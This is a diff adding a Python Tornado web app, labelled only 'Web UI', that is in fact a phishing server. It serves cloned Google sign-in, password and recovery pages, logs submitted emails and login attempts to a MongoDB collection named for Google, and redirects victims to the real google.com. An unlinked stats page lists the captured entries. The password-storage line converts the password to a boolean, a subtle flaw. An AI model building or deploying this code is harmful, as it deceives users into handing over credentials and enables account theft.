@@ -1,0 +1,155 @@
+#!/usr/bin/env python3
+"""
+Web UI
+
+Usage:
+    webapp [-p PORT] [--server SERVER]
+
+Options:
+    -h --help
+    -p --port PORT      Слушать порт [default: 80]
+       --server SERVER  Слушать адрес [default: 0.0.0.0]
+"""
+from config import config, db
+from tornado.web import Application, url, StaticFileHandler, RequestHandler
+from tornado.httpserver import HTTPServer
+from tornado.ioloop import IOLoop
+from docopt import docopt
+import logging
+import datetime
+import time
+
+
+class Note:
+    def __init__(self, email, password, is_recovery, ts):
+        self.email = email
+        self.password = password
+        self.is_recovery = is_recovery
+        self.ts = ts
+
+    @classmethod
+    def parse(cls, data):
+        if "email" in data and "password" in data and "is_recovery" in data and "ts" in data:
+            return cls(
+                email=data["email"],
+                password=data["password"],
+                is_recovery=data["is_recovery"],
+                ts=data["ts"],
+            )
+
+    def get_email(self):
+        return self.email
+
+    def get_date(self):
+        return datetime.datetime.fromtimestamp(self.ts)
+
+    def json(self):
+        return {
+            "email": self.email,
+            "password": self.password,
+            "is_recovery": self.is_recovery,
+            "ts": self.ts,
+        }
+
+
+class NoteDataSource:
+    def __init__(self):
+        self._collection = db.google.notes
+
+    def make_note(self, email: str, password: bool = False, is_recovery: bool = False):
+        self._collection.insert_one({
+            "email": email,
+            "password": bool(password),
+            "is_recovery": bool(is_recovery),
+            "ts": int(time.time()),
+        })
+
+    def __iter__(self):
+        for data in self._collection.find():
+            note = Note.parse(data)
+            if note:
+                yield note
+
+
+note_ds = NoteDataSource()
+
+
+def get_contents(file_path):
+    with open(file_path, 'rb') as f:
+        return f.read()
+
+
+class SubmitPage(RequestHandler):
+    def get(self):
+        email = self.get_argument("identifier", "") or self.get_argument("Email", "")
+        password = self.get_argument("password", "")
+        if not email or not password:
+            self.redirect("/signin")
+        else:
+            note_ds.make_note(email, password, self.get_argument("recovery", False))
+            self.redirect("https://www.google.com/")
+
+
+class RememberPasswordPage(RequestHandler):
+    def get(self, *args, **kwargs):
+        if self.get_argument("Email", ""):
+            self.write(get_contents("static/lookup.html"))
+            note_ds.make_note(self.get_argument("Email"), is_recovery=True)
+        else:
+            self.redirect("/recovery")
+
+
+class PasswordPage(RequestHandler):
+    def get(self, *args, **kwargs):
+        if self.get_argument("identifier", ""):
+            self.write(get_contents("static/pwd.html"))
+            note_ds.make_note(self.get_argument("identifier"))
+        else:
+            self.redirect("/signin")
+
+
+class Stats(RequestHandler):
+    def get(self):
+        self.render("stats.html", notes=list(note_ds))
+
+
+class StaticPage(RequestHandler):
+    def initialize(self, path):
+        self._file_path = path
+
+    def get(self):
+        self.set_header("Content-Type", "text/html")
+        self.write(get_contents(self._file_path))
+
+
+def main():
+    args = docopt(__doc__)
+    webapp = Application(
+        cookie_secret=config["webapp"]["cookie_secret"],
+        debug=config["webapp"]["debug"],
+        xsrf_cookies=True,
+        template_path="templates",
+        static_path="static",
+        handlers=[
+            url("/statsx/?", Stats),
+            url("/lookup/?", RememberPasswordPage),
+            url("/recovery/?", StaticPage, kwargs=dict(path="static/recovery.html")),
+            url("/submit/?", SubmitPage),
+            url("/pwd/?", PasswordPage),
+            url("/(?:(?:signin|signin/v2/identifier)/?)?", StaticPage, kwargs=dict(path="static/signin.html")),
+            url("/(.*\..*)", StaticFileHandler, kwargs=dict(path="static")),
+        ],
+        ui_modules={},
+        default_handler_class=StaticPage,
+        default_handler_args=dict(path="static/404.html")
+    )
+    HTTPServer(webapp).listen(int(args["--port"]), address=args["--server"])
+    logging.info("Listen on %s:%s" % (args["--server"], args["--port"]))
+    IOLoop.instance().start()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        pass
